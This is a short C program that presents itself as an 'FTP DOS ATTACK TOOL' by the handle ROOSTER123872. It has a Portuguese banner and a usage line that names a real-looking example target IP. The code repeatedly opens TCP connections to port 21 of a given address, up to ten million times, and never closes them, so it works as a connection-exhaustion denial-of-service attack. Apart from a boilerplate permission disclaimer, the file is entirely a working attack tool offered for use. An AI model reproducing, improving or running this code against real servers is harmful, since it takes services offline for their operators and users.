#include <stdio.h>
#include <stdlib.h>
#include <netdb.h>
#include <sys/socket.h>
#include <arpa/inet.h>

int main(int argc, char *argv[]){

if(argc < 2){
	 printf("\n");
    printf("  ██████╗  ██████╗ ███████╗\n");
    printf("  ██╔══██╗██╔═══██╗██╔════╝\n");
    printf("  ██║  ██║██║   ██║███████╗\n");
    printf("  ██║  ██║██║   ██║╚════██║\n");
    printf("  ██████╔╝╚██████╔╝███████║\n");
    printf("  ╚═════╝  ╚═════╝ ╚══════╝\n");
    printf("\n");
    printf("  =========================================\n");
    printf("   FTP DOS ATTACK TOOL - VERSION 1.0       \n");
    printf("   Coded by: ROOSTER123872                 \n");
    printf("  =========================================\n");
    printf("\n");
    printf("  [*] USO:    ./DOS <IP_ALVO>              \n");
    printf("  [*] EXEMPLO: ./DOS 37.59.174.225         \n");
    printf("\n");
    printf("  [!] AVISO: Use apenas em ambientes       \n");
    printf("      controlados e com permissao.         \n");
    printf("      O autor nao se responsabiliza        \n");
    printf("      pelo mau uso desta ferramenta.       \n");
    printf("\n");
    printf("  =========================================\n");
    printf("\n");

	return 1;
}

int repetidor;
int meusocket;
int conecta;
int inicio = 0;
int final = 10000000;

struct sockaddr_in alvo;

alvo.sin_family = AF_INET;
alvo.sin_port = htons(21);
alvo.sin_addr.s_addr = inet_addr(argv[1]);

for(repetidor=inicio;repetidor<final;repetidor++){

	meusocket = socket(AF_INET, SOCK_STREAM, 0);
	conecta = connect(meusocket, (struct sockaddr *)&alvo, sizeof alvo);

	if(conecta == 0){
		printf("[+] Conexao %d estabelecida!\n", repetidor);

	}
     }

	return 0;

}
